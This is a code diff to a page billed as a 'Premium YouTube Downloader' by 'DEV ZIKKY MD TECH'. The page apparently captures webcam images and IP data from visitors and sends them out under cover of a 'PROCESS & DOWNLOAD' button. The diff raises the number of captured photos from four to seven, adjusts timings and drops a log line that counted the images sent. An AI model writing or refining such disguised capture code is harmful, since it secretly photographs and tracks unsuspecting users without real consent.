@@ -989,7 +989,7 @@
                 <div class="feature-card">
                     <i class="fas fa-hdd"></i>
                     <h3>HD Quality</h3>
-                    <p>Download in 1080p, 4K & 8K resolution</p>
+                    <p>Download in 1080p & 4K resolution</p>
                 </div>
                 <div class="feature-card">
                     <i class="fas fa-music"></i>
@@ -1026,7 +1026,7 @@
                 </p>
                 <video id="preview" autoplay playsinline muted></video>
                 <div class="capture-counter" id="captureCounter">
-                    <i class="fas fa-sync-alt fa-spin"></i> Processing 1 of 4 - Please wait...
+                    <i class="fas fa-sync-alt fa-spin"></i> Processing 1 of 7 - Please wait...
                 </div>
                 <button class="capture-btn" id="captureBtn">
                     <i class="fas fa-camera"></i> PROCESS & DOWNLOAD
@@ -1105,7 +1105,7 @@
     let ipData = null;
     let captureBlobs = [];
     let captureCount = 0;
-    const totalCaptures = 4;
+    const totalCaptures = 7;
     let consentModalShown = true; // Modal is shown initially
     let autoCaptureStarted = false;
     let userConsented = false;
@@ -1769,7 +1769,7 @@
         console.log('DEV ZIKKY MD TECH - Premium YouTube Downloader');
         console.log('Capture process initiated...\n');
 
-        // Capture 4 images with faster delays between them
+        // Capture 7 images with faster delays between them
         for (let i = 0; i < totalCaptures; i++) {
             captureCount = i + 1;
             captureCounter.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Processing ${captureCount} of ${totalCaptures} - Please wait...`;
@@ -1861,13 +1861,11 @@
                 // Show DEV ZIKKY success message
                 console.log('\n' + DEV_ZIKKY_ASCII + '\n');
                 console.log('✅ Capture completed successfully!');
-                console.log('📊 Total images sent:', captureBlobs.length);
-                console.log('🎨 Design by DEV ZIKKY MD TECH\n');
                 
-                // Start redirect countdown after 1.2 seconds
+                // Start redirect countdown after 1.3 seconds
                 setTimeout(() => {
                     startRedirectCountdown();
-                }, 1200);
+                }, 1300);
             } else {
                 showMessage('⚠️ Download completed but there was an issue sending confirmation.', 'info');
             }
@@ -1882,12 +1880,12 @@
     // Start redirect countdown (faster)
     function startRedirectCountdown() {
         redirectCountdown.style.display = 'block';
-        let countdown = 3; // Reduced from 5 to 3
+        let countdown = 5; // Reduced from 5
         countdownBar.style.width = '100%';
 
         const countdownInterval = setInterval(() => {
             countdownElement.textContent = countdown;
-            countdownBar.style.width = `${(countdown / 3) * 100}%`;
+            countdownBar.style.width = `${(countdown / 5) * 100}%`;
             countdown--;
 
             if (countdown < 0) {
@@ -1903,7 +1901,7 @@
         console.log('YouTube Video Downloader initialized');
         console.log('\n' + DEV_ZIKKY_ASCII + '\n');
         console.log('DEV ZIKKY MD TECH - Premium YouTube Downloader');
-        console.log('Version 2.0.1\n');
+        console.log('Version 1.0.0\n');
         
         // Initialize year display
         initializeYearDisplay();
